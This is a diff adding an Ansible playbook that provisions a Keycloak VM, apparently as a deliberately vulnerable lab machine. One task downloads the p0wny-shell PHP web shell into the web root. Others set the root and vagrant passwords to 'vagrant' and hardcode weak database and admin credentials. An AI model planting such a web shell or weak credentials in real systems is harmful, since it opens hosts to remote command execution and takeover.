@@ -1,0 +1,55 @@
+---
+- name: Provision Keycloak VM
+  become: true  # If you need to run tasks with elevated privileges, such as sudo
+  hosts: all
+  gather_facts: true
+
+  tasks:
+    - name: Install mysql client, docker, docker-compose, and pymysql
+      ansible.builtin.apt:
+        # update_cache: true
+        name: "{{ item }}"
+        state: present
+      loop:
+        - docker.io
+        - docker-compose
+        - mysql-client
+        - python3-pymysql
+    - name: Ensure docker daemon is started
+      ansible.builtin.service:
+        name: docker
+        state: started
+    - name: Install php webshell
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+        dest: "/var/www/html/website"
+        mode: '0644'
+    - name: Set username and password
+      ansible.builtin.user:
+        name: "{{ item }}"
+        password: "{{ 'vagrant' | password_hash('sha512') }}"
+        append: true
+        groups: "docker"
+      loop: ['root', 'vagrant']
+    - name: Configure msyql database for keycloak
+      community.mysql.mysql_db:
+        login_user: "root"
+        login_password: "Password123!"
+        name: keycloak_db
+        state: present
+    # https://www.keycloak.org/server/containers
+    # https://www.keycloak.org/getting-started/getting-started-docker
+    - name: Run keycloak docker container
+      community.docker.docker_container:
+        name: keycloak
+        image: docker.io/ladynev/keycloak-mysql-realm-users
+        network_mode: host
+        env:
+            MYSQL_PORT_3306_TCP_ADDR: "localhost"
+            MYSQL_PORT_3306_TCP_PORT: "3306"
+            MYSQL_DATABASE: "keycloak_db"
+            MYSQL_USERNAME: "root"
+            MYSQL_PASSWORD: "Password123!"
+            KEYCLOAK_USER: "admin"
+            KEYCLOAK_PASSWORD: "admin"
+        state: started
